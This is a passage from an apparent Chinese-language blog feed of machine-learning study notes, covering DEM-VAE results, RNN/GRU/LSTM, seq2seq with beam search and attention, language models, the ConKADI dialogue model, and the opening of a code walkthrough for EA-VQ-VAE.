<p>可以看出，同时引入互信息项和分散项的 VAE（DGM-VAE，DEM-VAE）的各个分量分布有着较为明显的分类边界，没有出现模式崩溃问题。</p>
<h3 id="文本生成">文本生成</h3>
<p>作者使用四个指标：逆困惑度、BLEU、词级 KL 散度、负对数似然来评估文本生成的质量。其中，逆困惑度是指一个 LSTM 语言模型，从 VAE 的先验分布中采样的数据上进行训练，再在测试集上进行评估。实验结果如下：</p>
<p><img src="lg-result.png"></p>
<p>可以看到，正如前文作者所说，由于引入了额外的分散项，使得 NLL（负对数似然）相较基线模型更大，但是 rPPL，BLEU 等指标上取得了更好的结果。</p>
<h2 id="总结">总结</h2>
<p>这篇论文也是离散 VAE 的一种尝试，在混合高斯分布的基础上，引入额外的分散项来解决模式崩溃问题。这使得模型的解释性更强。与之前介绍过得 EQ-VAE 相比，隐变量可以表征更多信息。感觉还是很有意义的工作，就是有点难懂。。。</p>
<h2 id="参考">参考</h2>
<p><a href="https://www.iczhiku.com/hotspotDetail/q7K2UUl4a6Isl4ZlEzOrgg==">ICML 2021 | DEM-VAE：一类新的可解释文本生成模型 - IC 智库 (iczhiku.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>循环神经网络 RNN 及其变体 GRU、LSTM</title>
    <url>/blog/2021/07/22/rnns/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>同样，借着复习面试，把 RNN 家族再梳理回顾一下，包含 RNN、GRU、LSTM。 <span id="more"></span></p>
<h2 id="循环神经网络rnn">循环神经网络 RNN</h2>
<h3 id="模型结构">模型结构</h3>
<p><img src="rnn.png"></p>
<p>RNN 的结构如上图所示，其核心思想是使用同一套参数来更新状态<span class="math inline"> \(s\)</span> 与计算输出<span class="math inline"> \(o\)</span>，箭头右侧是按时序展开的模型结构图。可以看到，RNN 仅使用了一个状态<span class="math inline"> \(s\)</span>​来保存序列信息，共有三个参数矩阵。这一部分公式化描述如下: <span class="math display">\[
s_t=f(Ux_t+Ws_{t-1})
\]</span></p>
<p><span class="math display">\[
o_t=g(Vs_t)
\]</span></p>
<p>其中，<span class="math inline">\(f\)</span> 与<span class="math inline"> \(g\)</span>​均为激活函数，激活函数可选的有 sigmoid，tanh，relu 等（下面会分析）。</p>
<p>RNN 有以下缺陷：</p>
<ul>
<li>容易发生梯度消失和梯度爆炸现象（由于导数连乘）。</li>
<li>难以捕捉长距离的依赖。</li>
</ul>
<p>在其中，梯度消失相对于梯度爆炸要更为严重，因为梯度爆炸是可以观测到的（NAN），梯度消失则难以直接观测。梯度爆炸问题很容易解决，可以通过梯度裁剪的方法进行解决。</p>
<h3 id="梯度消失和梯度爆炸">梯度消失和梯度爆炸</h3>
<p>梯度消失和爆炸的解决方法：</p>
<ul>
<li>梯度的剪切以及正则化（常见的是 l1 正则和 l2 正则）。</li>
<li>relu、elu 等激活函数。（梯度消失）</li>
<li>批标准化（<strong>Batch Normalization</strong>）。</li>
<li>残差结构（将映射 F (x) 改为 F (x)+x，使用 relu 激活函数的 F 在 x&lt;0 时能够无损传播梯度，保证了深层网络的性能）。</li>
<li>LSTM、GRU 等结构。</li>
</ul>
<h4 id="批标准化-batch-normalization">批标准化 Batch Normalization</h4>
<p>Batch Normalization 是一种常用于 CNN 的正则化方法，可以分为两个步骤：</p>
<p>（1）标准化：对 batch 的数据求均值与标准差，将数据标准化到标准正态分布</p>
<p>（2）进行放缩与平移</p>
<p>整个过程类似于 VAE 的重参数化，先获得一个正态分布的变量，再进行放缩平移，达到从任意正态分布中取样的效果。</p>
<p>也就是说，batch normlization 假设每个 batch 的数据服从一个正态分布（参数 γ 和 β 学习得来，即通过 batch 数据计算得来），先将数据标准化，再放缩与平移，使得数据 “看起来” 是从这个正态分布中取样而来的。</p>
<p>在预测阶段，所有参数的取值是固定的，对 BN 层而言，意味着 μ、σ、γ、β 都是固定值。γ 和 β 比较好理解，随着训练结束，两者最终收敛，预测阶段使用训练结束时的值即可。</p>
<p>对于 μ 和 σ，在训练阶段，它们为当前 mini batch 的统计量，随着输入 batch 的不同，μ 和 σ 一直在变化。在预测阶段，输入数据可能只有 1 条，该使用哪个 μ 和 σ，或者说，每个 BN 层的 μ 和 σ 该如何取值？可以采用训练收敛最后几批 mini batch 的 μ 和 σ 的期望，作为预测阶段的 μ 和 σ。</p>
<h3 id="层标准化-layer-normalization">层标准化 Layer Normalization</h3>
<p>Batch Normalization 是在 Batch 的方向上进行 Normalization。这种方法在 NLP 中不是很适合。由于文本序列的长度可变性，一个 batch 中的数据往往长度不同，进而对每个位置进行标准化不是很合适。</p>
<p>而 Layer Normalization 则是在序列的方向上进行 Normalization。这使得它可以处理变长序列。</p>
<h3 id="激活函数">激活函数</h3>
<p>对于激活函数而言，sigmoid 的最大梯度为 0.25，因此很容易发生梯度消失现象，而 tanh 虽然最大梯度为 1，但也只有 0 处取得，也容易 发生梯度消失。因此 RNN 常使用 relu 作为激活函数。relu 的梯度非 0 即 1，这能够缓解梯度消失现象，但也有一定的问题：1. 容易发生梯度爆炸。（梯度恒为 1 时）2. 负数部分梯度恒为 0，部分神经元无法激活。elu 能够缓解 relu 的 0 梯度的问题，但是由于加入了幂运算，会更慢一点。</p>
<h2 id="门控循环单元gru">门控循环单元 GRU</h2>
<h3 id="模型结构-1">模型结构</h3>
<p>GRU 的思想是在 RNN 的基础上，引入门控信号来缓解 RNN 存在的梯度消失问题。模型结构如下：</p>
<p><img src="gru.png"></p>
<p>公式化描述如下（公式中的<span class="math inline"> \(\odot\)</span> 代表哈达玛积，即同型矩阵间逐元素乘法）：</p>
<p>首先根据输入<span class="math inline"> \(x_t\)</span> 与上一时刻隐藏状态<span class="math inline"> \(h_{t-1}\)</span> 计算得到两个门控状态<span class="math inline"> \(z_t\)</span> 与<span class="math inline"> \(r_t\)</span>​，假设<span class="math inline"> \(h_t\in \mathbb R^H\)</span>： <span class="math display">\[
z_t=sigmoid(W_zx_t+U_zh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
r_t=sigmoid(W_rx_t+U_rh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p>之后，使用重置门计算得到一个新的隐藏状态（即图中的<span class="math inline"> \(h’\)</span>）： <span class="math display">\[
\tilde h_t=tanh(Wx_t+U(r_t\odot h_{t-1}))\in \mathbb R^{H}
\]</span> 再使用更新门<span class="math inline"> \(z_t\)</span> 更新隐藏状态： <span class="math display">\[
h_t=(1-z)\odot h_{t-1}+z\odot \tilde h_t\in \mathbb R^{H}
\]</span></p>
<h2 id="长短期记忆网络lstm">长短期记忆网络 LSTM</h2>
<h3 id="模型结构-2">模型结构</h3>
<p>LSTM 的思想是在 RNN 的基础上，加入一个不易被改变的新状态<span class="math inline"> \(c_t\)</span>​​，代表的是 0-t 时刻的全局信息。而<span class="math inline"> \(h_t\)</span>​代表的是在 0~t-1 时刻全局信息的影响下，<span class="math inline">\(t\)</span> 时刻的信息。换而言之，<span class="math inline">\(c_t\)</span> 变化的很慢，而<span class="math inline"> \(h_t\)</span> 变化的很快。</p>
<p><img src="lstm.png"></p>
<p>公式化描述如下：</p>
<p>首先计算得到三个门控状态（分别对应图中的<span class="math inline"> \(z^i,z^f,z^o\)</span>）： <span class="math display">\[
i_t=sigmoid(W_ix_t+U_ih_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
f_t=sigmoid(W_fx_t+U_fh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
o_t=sigmoid(W_ox_t+U_oh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p>以及一个与当前输入密切相关的向量（对应图中的<span class="math inline"> \(z\)</span>） <span class="math display">\[
\tilde c_t=tanh(W_zx_t+U_zh_{t-1})
\]</span> 接着，更新两种状态： <span class="math display">\[
c_t=f_t\odot c_{t-1}+i_t\odot \tilde c_t
\]</span></p>
<p><span class="math display">\[
h_t=o_t\odot tanh(c_t)
\]</span></p>
<p>其中，<span class="math inline">\(i_t.f_t,o_t\)</span> 分别代表信息、遗忘、输出门控。信息和遗忘门控负责 cell state 的更新，输出门控负责 hidden state 的更新。具体而言，LSTM 可以简单分为以下三个阶段：</p>
<ul>
<li>遗忘阶段，根据遗忘门控，忘记上一个 cell state 的部分信息。</li>
<li>记忆阶段，根据信息门控，将输入信息进行选择记忆。</li>
<li>输出阶段，根据输出门控，输出最终的状态。</li>
</ul>
<h3 id="lstm-vs-gru">LSTM VS GRU</h3>
<p>本质上，LSTM 和 GRU 都是通过引入门控信号来解决 RNN 的梯度消失问题。在实现方法上，GRU 相对于 LSTM 要更为简单。GRU 抛弃了 LSTM 中的 hidden state（GRU 中的 hidden state 实际上是 LSTM 中的 cell state），因为 LSTM 中的<span class="math inline"> \(h_t\)</span> 只是想保存当前时刻的信息，这一部分已经包含到 GRU 中的<span class="math inline"> \(\tilde h_t\)</span> 中了。cell state 中的之前的全局信息与当前时刻的信息应当是一个此消彼长的状态，GRU 因此直接使用一个门控信号<span class="math inline"> \(z_t\)</span> 同时控制了遗忘和更新。</p>
<p>在参数上，GRU 有着比 LSTM 更少的参数，收敛速度更快，并且与 LSTM 有着差不多的性能表现，因此实际工程中多使用 GRU。</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/68579467">深度学习之 3—— 梯度爆炸与梯度消失 - 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/32481747">人人都能看懂的 GRU - 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/32085405">人人都能看懂的 LSTM - 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/55386469#:~:text=这里归纳一下%20LSTM%20与%20GRU%20的区别：%20首先，,LSTM%20选择暴露部分信息（%20才是真正的输出，%20只是作为信息载体，并不输出">RNN vs LSTM vs GRU -- 该选哪个？ - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>循环神经网络</category>
      </categories>
      <tags>
        <tag>RNN</tag>
        <tag>GRU</tag>
        <tag>LSTM</tag>
      </tags>
  </entry>
  <entry>
    <title>序列到序列模型</title>
    <url>/blog/2021/07/22/seq2seq/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>序列到序列模型（sequence to sequence, seq2seq）是自然语言处理中的一个重要模型，在机器翻译、对话系统等多个领域都有着广泛的应用。今天借着准备面试的机会，将这一部分知识整理出一篇博客。</p>
<span id="more"></span>
<h2 id="seq2seq">seq2seq</h2>
<p><img src="basemodel.png"></p>
<p>seq2seq 模型常用语序列间的转化任务，其结构如上图所示，主要由两部分组成：</p>
<ul>
<li>编码器，常见为循环神经网络，用以将输入序列编码为固定维度的向量（即最后时刻编码器的隐藏状态），进而投喂给解码器进行解码。</li>
<li>解码器，同样常见为循环神经网络，用以根据向量输出最终序列。可以看做一个条件语言模型，“条件” 即为输入序列。因此，可以使用预训练的语言模型初始化权重，再进行 fine-tune。</li>
</ul>
<p>在训练阶段，解码器的输出仅用于计算损失，解码器的输入是编码器得到的上下文状态向量 (最后一个时间步的隐藏状态) 和目标序列当前的单词。换而言之，训练时，解码器的输出一定是与目标序列等长的。</p>
<p>在推理阶段，解码器每一个时间步的输出是下一个时间步的输入。可以通过限制输出序列的最大长度或者在输出结束标志后停止。对于 batch 的数据，往往使用限制最大长度，再删去结束标志之后的部分。</p>
<p>seq2seq 虽然简单有效，但存在以下的缺点：</p>
<ul>
<li>输入序列过长时，固定长度的向量无法存储全部的信息，进而造成信息丢失。</li>
<li>贪婪解码问题，下面会提到。</li>
</ul>
<h2 id="贪婪解码问题">贪婪解码问题</h2>
<p>对于 seq2seq 模型，我们希望得到概率最大的输出序列，即建模的是<span class="math inline"> \(\arg\max_YP(Y|X)\)</span>（<span class="math inline">\(X\)</span> 为输入序列，<span class="math inline">\(Y\)</span> 为输出序列）。然而事实上，解码器每一步求解的是<span class="math inline"> \(\arg\max_{y_t}P(y_t|y_{t-1:1},X)\)</span>​，即当前时间步概率最大的单词。这样以来，整个解码的过程就是贪婪的，每一步的单词概率最大并不意味着整个句子的概率最大。</p>
<p>怎么解决这个问题呢？解决方法是 beam search（光束搜索）。核心思想是，在推理阶段（训练时不需要，因为知道 ground truth），</p>
<p>保留 k 个可能性最大的序列（可能性以概率相乘的对数作为分数，即<span class="math inline"> \(\sum_{i=1}^tlogP_{I,M}(y_i|y_{i-1:1},X)\)</span>​）。</p>
<p>当某个序列输出终止符号时，可以认作该序列已经结束，继续维护其他序列。</p>
<p>搜索的终止条件可以根据任务具体选择，例如：</p>
<ul>
<li>最多搜索多长时间步（例如 30 步）。</li>
<li>至少拥有多少个候选序列（例如 10 个）。</li>
</ul>
<p>在搜索结束，得到若干个候选序列后，将序列分数标准化后，即<span class="math inline"> \(\frac{1}{t}\sum_{i=1}^tlogP_{I,M}(y_i|y_{i-1:1},X)\)</span>​作为最终的分数。这样是为了避免短序列概率更大（概率连乘的数量小），然后选择概率最大的序列。</p>
<p>在搜索时，分数不需要进行标准化，因为搜索时处理的序列总是等长的。</p>
<h2 id="注意力机制">注意力机制</h2>
<p>为了解决 seq2seq 在面对长序列时的信息丢失问题，研究者们在 seq2seq 中引入了注意力（Attention）机制。借助于注意力机制，解码器能够在解码时与输入序列直接相连，还可以关注到输入序列的不同部分。公式化描述如下：</p>
<p>首先根据编码器状态<span class="math inline"> \({h_1,\dots,h_N}\)</span> 与当前解码器状态<span class="math inline"> \(s_t\)</span> 点乘计算分数 <span class="math display">\[
e^t=[s_t^\intercal h_1,\dots,s_t^\intercal h_N]\in \mathbb R^N
\]</span> 将分数归一化后作为输入序列与当前位置相关性的概率分布： <span class="math display">\[
\alpha^t=softmax(e^t)\in \mathbb R ^N
\]</span> 加权求和后作为最终的注意力结果： <span class="math display">\[
\alpha_t=\sum_{i=1}^N\alpha_i^th_i\in \mathbb R^h
\]</span> 将注意力结果与解码器隐藏状态拼接后计算新的隐藏状态<span class="math inline"> \(\hat s_t\)</span>，再计算输出。 <span class="math display">\[
[\alpha_t;s_t]\in \mathbb R^{2h}
\]</span> 带有 Attention 的 seq2seq 的简单示意图如下：</p>
<p><img src="model.png"></p>
<h3 id="广义的attention机制">广义的 Attention 机制</h3>
<p>广义的 attention 定义如下：给定一组向量 values，一个向量 query，attention 是 value 的加权和，权重是某个相似性度量函数，例如点积、加性注意力等。</p>
<p>度量函数可以为：</p>
<ul>
<li><p>点乘：<span class="math inline">\(e_i=s^\intercal h_i\in \mathbb R\)</span></p></li>
<li><p> 乘法注意力：<span class="math inline">\(e_i=s^\intercal Wh_i \in \mathbb R\)</span>​（其中<span class="math inline"> \(W\in \mathbb R^{d_2*d_1}\)</span> 为权重矩阵）</p></li>
<li><p>加法注意力：<span class="math inline">\(e_i=v^\intercal tanh(W_1h_i+W_2s)\in \mathbb R\)</span>​（其中<span class="math inline"> \(W_1,W_2\)</span> 为权重矩阵，<span class="math inline">\(v\)</span> 是权重向量）</p></li>
</ul>
<p>对应到 seq2seq 的 Attention 机制中，query 向量为解码器隐藏状态，values 为编码器的全部隐藏状态，度量函数为点乘。</p>
<p>联想一下 BERT 的自注意力机制：</p>
<p>对于每个单词向量，通过 Query、Key、Value 三个参数矩阵计算得到三个向量：q,k,v。在每个位置，使用当前位置的 query 向量与每个位置的 key 做点乘，作为相似性度量，再对 value 矩阵加权求和。公式如下： <span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>seq2seq</category>
      </categories>
      <tags>
        <tag>seq2seq</tag>
      </tags>
  </entry>
  <entry>
    <title>语言模型</title>
    <url>/blog/2021/07/22/language-model/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>语言模型是自然语言处理的一个重要部分，在很多生成式任务中，都离不开语言模型。今天我想梳理一下我所理解的语言模型及其发展。</p>
<span id="more"></span>
<h2 id="定义">定义</h2>
<p>对于一串语言序列<span class="math inline"> \(w_1w_2\dots w_n\)</span>，语言模型试图分析其出现的概率，即<span class="math inline"> \(P(w_1,w_2,\dots,w_n)\)</span>​​​​。进而，可以通过概率大小判断文本是否合理。例如句子 “学生们打开了书” 的概率应该比 “学生们打开了玛卡巴卡” 高得多，即更像是人说的话。</p>
<p>在之前的 VQ-VAE 中，我们提到过自回归模型，按照自回归的思路，如果第 n 个单词只与前 n-1 个单词相关，那么句子的概率可以转化为如下形式： <span class="math display">\[
P(w_1,w_2,\dots,w_n)=\prod_t^nP(w_t|w_{t-1:1})
\]</span> 那么怎么求解右侧的式子呢？</p>
<h2 id="n-gram">N-gram</h2>
<p>首先要提到的是 N-gram 模型。为了解决上面这个问题，N-gram 模型引入了马尔科夫假设，认为某一个词只与它之前的<span class="math inline"> \(N-1\)</span> 个词有关。以 4-gram 为例，即每个词只与其之前的 3 个词有关，即： <span class="math display">\[
P(w_n|w_{n-1:1})=P(w_n|w_{n-1},w_{n-2},w_{n-3})
\]</span> 换而言之，只要在大规模语料中进行频数的统计，那么就可以得到上述概率的估计： <span class="math display">\[
P(w_n|w_{n-1},w_{n-2},w_{n-3})=\frac{C(w_n,w_{n-1},w_{n-2},w_{n-3})}{C(w_{n-1},w_{n-2},w_{n-3})} 
\]</span> 进而整个句子的概率可以计算如下： <span class="math display">\[
P(w_1,w_2,\dots,w_n)=\prod_t^nP(w_t|w_{t-1},w_{t-2},w_{t-3})
\]</span> 上述的方法虽然简单直接，但是有以下缺点：</p>
<ul>
<li>稀疏问题：一些片段可能没有在语料中出现，计数为 0，在概率连乘之下整句概率变为 0。</li>
<li>存储问题：随着 n 的增大，存储量指数级上升，而 n 过小时模型性能又会很差。</li>
</ul>
<h2 id="基于窗口的神经网络">基于窗口的神经网络</h2>
<p>在 N-gram 的基础上，使用神经网络来计算条件概率。同样以 4-gram 为例，计算用公式表达如下: <span class="math display">\[
\begin{align}
P(w_n|w_{n-1:1})&amp;=P(w_n|w_{n-1},w_{n-2},w_{n-3})\\
&amp;=softmax(W[w_{n-1};w_{n-2};w_{n-3}])
\end{align}
\]</span> 思路非常简单，即将前 N-1 个词输入到神经网络，由神经网络计算得到第 N 个词的概率分布。这样做解决了 N-gram 的稀疏问题与存储问题，但也存在一些问题：</p>
<ul>
<li>缺少参数共享：以上述公式为例，<span class="math inline">\(W\)</span>​​​中可以分为三部分，分别处理前三个词。然而，词向量的处理逻辑应该是相似的（因为他们都是同样的方法训练出来的）。</li>
<li>需要变化窗口大小时，矩阵 W 的形状也需要变化，进而需要重新训练。</li>
</ul>
<h2 id="循环神经网络rnn">循环神经网络 RNN</h2>
<p>RNN 的思路同样也很直接，使用同一个矩阵<span class="math inline"> \(W\)</span> 来处理词向量，并使用一个隐藏状态来记录已处理的信息（换而言之，就无需马尔科夫假设）。RNN 的公式如下: <span class="math display">\[
h_t=\sigma(W^{(hh)}h_{t-1}+W^{(hx)}x_t)
\]</span></p>
<p><span class="math display">\[
\hat{y_t}=softmax(W^{(S)}h_t)
\]</span></p>
<p>其中，<span class="math inline">\(\sigma\)</span> 是激活函数，<span class="math inline">\(h_t\)</span> 是 t 时刻的隐藏状态，<span class="math inline">\(W\)</span> 是参数矩阵。</p>
<p>RNN 有以下优点：</p>
<ul>
<li>能够处理任意长度的序列。</li>
<li>没有进行马尔科夫假设，理论上每一时刻模型都知道之前时刻的全部信息。</li>
</ul>
<p>但也有以下缺点：</p>
<ul>
<li>会出现梯度消失和梯度爆炸问题。</li>
<li>不支持并行化，计算较慢。（可以说是自回归模型的通病）</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/63397627">CS224N 笔记 (六)：语言模型与 RNN - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>语言模型</category>
      </categories>
      <tags>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>ConKADI</title>
    <url>/blog/2021/07/20/ConKADI/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来看一篇对话系统的文章，收录于 2020 年的 ACL。这篇文章是常识对话模型（CCM）的后续工作，我之前粗读过一次，还有很多疑惑，今天正好借着这个机会细读一遍。在此之前，先梳理一下对话系统的发展历史。</p>
<span id="more"></span>
<h2 id="对话系统发展简介">对话系统发展简介</h2>
<p>对话系统，即能够与人进行对话的计算机系统，是自然语言处理中的一个重要方向。在前神经网络时期，对话系统主要基于模板生成回复。即使是现在，仍由一些场景下在使用基于模板的回复生成。在 2014 年，seq2seq（Sequence to sequence）模型被提出。seq2seq 提供了一种序列间进行转换映射的通用方法。此后，seq2seq 被广泛用于各类序列任务，包含对话系统。但是 seq2seq 应用于对话系统任务时会有以下问题：</p>
<ul>
<li>对同一输入，只能生成单一回复。而理想的对话系统间输入与回复间的关系应该是一对多的。</li>
<li>倾向于生成通用性回复（例如，我不知道）。</li>
</ul>
<p>此后，构建能够生成多样性回复的对话系统一直是研究人员研究的重点。2017 年，zhao 等人将条件变分自编码器（Condition vae，CVAE）应用于对话生成，通过在隐变量分布中采样不同的隐变量，模型能够生成多样的回复。</p>
<p>另外，有研究指出，对话模型生成通用性回复的原因之一是语料中缺少人类拥有的知识背景，这使得模型无法学习知识进而理解对话。基于此，一部分工作开始探索在对话模型中引入外部知识。2018 年 zhou 等提出的常识对话模型（CCM）就是这类研究的典型代表。</p>
<p>常识对话模型 CCM 虽然比传统模型取得了更好的效果，但是 CCM 在检索知识实体相关知识事实时，没有考虑到实体单词所在的上下文，而复杂实体单词的具体含义往往是由其上下文决定的。这就来到了本文要介绍的 ConKADI。</p>
<p><img src="apple.png"></p>
<h2 id="研究方法">研究方法</h2>
<p>本文提出了：</p>
<ul>
<li>Felicitous Fact mechanism（恰当事实机制）帮助模型关注在上下文高度相关的知识事实。</li>
<li>上下文知识融合以及灵活模式融合技术，促进知识的集成。</li>
</ul>
<p>ConKADI（Context Knowledge-Aware Diverse and Informative conversation generation model），别的不说，这个名字真的跟叠 buff 一样。。。模型的流程如下：</p>
<ol type="1">
<li>恰当事实机制根据知识实体词所在上下文计算得到知识事实的概率分布。（此过程中，使用真实回复作为后验来监督学习）。</li>
<li>上下文融合机制在解码之前将上下文与知识融合。</li>
<li>ConKADI 在灵活融合模式下生成三种类型的单词。</li>
</ol>
<h3 id="模型概览">模型概览</h3>
<p><img src="model.png"></p>
<p>主要由以下几部分组成：</p>
<ul>
<li>知识检索器（Knowledge Retriever）：给定输入<span class="math inline"> \(X\)</span>，对于每一个单词<span class="math inline"> \(x_i\)</span>，检索<span class="math inline"> \(x_i\)</span>​作为头实体或者尾实体的知识事实，若不为实体词，则返回一个空事实。</li>
<li>上下文编码器（Context Encoder）：使用双向 GRU 进行编码，特殊的是，GRU 的输入加入了当前实体词的嵌入向量。</li>
<li>恰当知识识别器（Felicitous Fact Recognizer）：计算检索事实<span class="math inline"> \(F=\{f_1,f_2,\dots,f_n\}\)</span>​上的概率分布<span class="math inline"> \(z\)</span>，计算过程如下:</li>
</ul>
<p><span class="math display">\[
z_{post}=\eta(\phi(F\cdot W_{ft})\cdot\phi([{h^x_n}^\intercal;{h^y_m}^\intercal]\cdot W_{post}))^\intercal
\]</span></p>
<p><span class="math display">\[
z_{prior}=\eta(\phi(F\cdot W_{ft})\cdot\phi({h^x_n}^\intercal\cdot W_{prior}))^\intercal
\]</span></p>
<p>其中，<span class="math inline">\(\eta\)</span>​​是 softmax 函数，<span class="math inline">\(\phi\)</span>​​是 tanh 激活函数，<span class="math inline">\(F\in R^{l*(d_e+d_r+d_e)}\)</span>​​是知识事实矩阵，<span class="math inline">\(W_{ft},W_{post},W_{prior}\)</span>​​​​​是训练参数​。直观来看，上下文、知识事实都包含在公式中，但是也不好进一步解释公式的由来，更像是两部分拼凑在一起的。与 VAE 一样，在得到先后验分布后，使用 KL 散度作为损失函数<span class="math inline"> \(\mathcal L_k\)</span>，达到逼近先后验分布的效果。</p>
<ul>
<li>上下文知识融合：为了增强解码器对知识背景的理解，将输入上下文与知识融合作为解码器的初始权重，即<span class="math inline"> \({h^y_0}^\intercal=tanh([{h^x_n}^\intercal;f_z^\intercal]\cdot W_{init})\)</span>​</li>
</ul>
<p>此外，为了保证<span class="math inline"> \({h^x_n}^\intercal,f_z^\intercal\)</span> 是有意义的，模型中还引入了词袋损失（参考 CVAE）。为了监督<span class="math inline"> \(z_{post}\)</span>​的概率分布的计算，引入了监督的条件信号（参考 CCM），二者之和为损失函数<span class="math inline"> \(\mathcal L_f\)</span>。​</p>
<h3 id="知识解码器">知识解码器</h3>
<p>解码器同样是 GRU，在解码时，会从以下三种类型的单词中选择进行输出：</p>
<ul>
<li>词表单词</li>
<li>知识实体单词，计算过程如下：</li>
</ul>
<p><span class="math display">\[
z_{d,t}=\eta(\phi(F\cdot W_{ft})\cdot\phi([{h^y_t}^\intercal;{u_{t-1}}^\intercal]\cdot W_{d}))^\intercal
\]</span></p>
<p><span class="math display">\[
\gamma_t=sigmoid([{h^y_t}^\intercal;u_t^\intercal;c_t^\intercal]\cdot W_{gate})\in R^1
\]</span></p>
<p><span class="math display">\[
p_{k,t}=\gamma_t*z+(1.0-\gamma_t)*z_d
\]</span></p>
<p>其中，<span class="math inline">\(c_t\)</span> 是注意力机制的结果，<span class="math inline">\(z_{d,t}\)</span> 也是同样方法计算得到的知识事实的概率分布，与<span class="math inline"> \(z\)</span> 相比，<span class="math inline">\(z_{d,t}\)</span> 是动态的，而<span class="math inline"> \(z\)</span> 是静态的，与 CCM 中的动 / 静态图注意力机制类似。之后，计算得到一个标量<span class="math inline"> \(\gamma_t\)</span> 作为二者的相对比例，求和得到最终的实体单词权重。</p>
<ul>
<li>复制单词。解码器可从输入中复制一个单词作为输出，计算过程如下：</li>
</ul>
<p><span class="math display">\[
p_{c,t}=\eta(\phi(H^x\cdot W_{cs})\cdot\phi({u_t^c}^\intercal\cdot W_{ct})^\intercal)
\]</span></p>
<p><span class="math display">\[
{u^c_t}^\intercal=[{h^y_t}^\intercal,{u_{t-1}}^\intercal,{c_t}^\intercal]
\]</span></p>
<p>计算形式与前文知识事实概率分布的计算相似。</p>
<h3 id="灵活模式融合">灵活模式融合</h3>
<p>最终输出的概率分布为三种模式的加权和（其中，<span class="math inline">\((\gamma_{w,t},\gamma_{k,t},\gamma_{c,t})\)</span> 是由灵活模式融合计算得出的概率分布，即三者之和为 1。）： <span class="math display">\[
p_{out,t}=\gamma_{w,t}*p_{w,t}+\gamma_{k,t}*p_{k,t}+\gamma_{c,t}*p_{c,t}
\]</span> 这一部分损失函数为<span class="math inline"> \(\mathcal L_n\)</span>： <span class="math display">\[
-\sum_t\lambda_tlogp_{out,t}(y_t|y_{t-1:1},X,F)+\frac{\mathcal L_m}{2}
\]</span> 其中，<span class="math inline">\(\mathcal L_m\)</span> 为解码器输出与真实回复间的交叉熵，<span class="math inline">\(\lambda_t\)</span>​为词表外单词（unk）的惩罚项权重： <span class="math display">\[
\lambda_t=
\begin{cases}
\frac{1}{\#(unk\in Y)}^3,\ if\ y_t=unk\\
1,\ otherwise
\end{cases}
\]</span> 个人猜测思路是这样，如果<span class="math inline"> \(y_t\)</span> 为 unk，<span class="math inline">\(\lambda_t\)</span>​会更小，进而优化对应参数的速度会减慢。</p>
<h2 id="case-study">Case Study</h2>
<p>下文是论文中展示的回复样例，只看表格生成回复的效果还是不错的。</p>
<p><img src="result.png"></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话系统</category>
      </categories>
      <tags>
        <tag>常识对话</tag>
        <tag>CopyNet</tag>
      </tags>
  </entry>
  <entry>
    <title>EA-VQ-VAE 代码学习（1）</title>
    <url>/blog/2021/07/17/ea-vq-vae-code/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>之前学习 EA-VQ-VAE 的时候发现只读论文本身还是有很多细节问题不太懂，而 EA-VQ-VAE 的代码开源在 <a href="https://github.com/microsoft/EA-VQ-VAE">github</a> 上。今天正好通过学习代码更深层地理解一下这个模型以及基础的 VQ-VAE 模型。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>代码的目录结构如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">│  README.md</span><br><span class="line">|  LICENSE</span><br><span class="line">├─data</span><br><span class="line">│      get_atomic_data.sh</span><br><span class="line">│      get_event2mind_data.sh</span><br><span class="line">│      preprocess-atomic.py</span><br><span class="line">│      preprocess-event2mind.py</span><br><span class="line">├─estimator</span><br><span class="line">│      model.py</span><br><span class="line">│      run.py</span><br><span class="line">├─generator</span><br><span class="line">│      beam.py</span><br><span class="line">│      model.py</span><br><span class="line">│      run.py</span><br><span class="line">└─vq-vae</span><br><span class="line">        gpt2.py</span><br><span class="line">        model.py</span><br><span class="line">        run.py</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，整个代码目录结构还是比较清晰的四部分：</p>
<ul>
<li>data/：用以数据的获取和预处理</li>
<li> estimator/：估计先验分布的模型</li>
<li> generator/：推理阶段生成推理文本（光束搜索等）</li>
<li>vq-vae/：vq-vae 的模型定义：包含 codebook、编码器、解码器等</li>
</ul>
<p>这次先介绍最为核心的 vq-vae 模型，处在 vq-vae/model.py。剩下的部分后续有时间再进行分享。</p>
<h2 id="vq-vae">VQ-VAE</h2>
<h3 id="model.py">model.py</h3>
<p>首先是 CodeBook。codebook 在 EA-VQ-VAE 充当了隐变量表的角色，保存了一张由 K 个 D 维隐变量组成的<span class="math inline"> \(R^{K*D}\)</span>。CodeBook 类代码如下：</p>
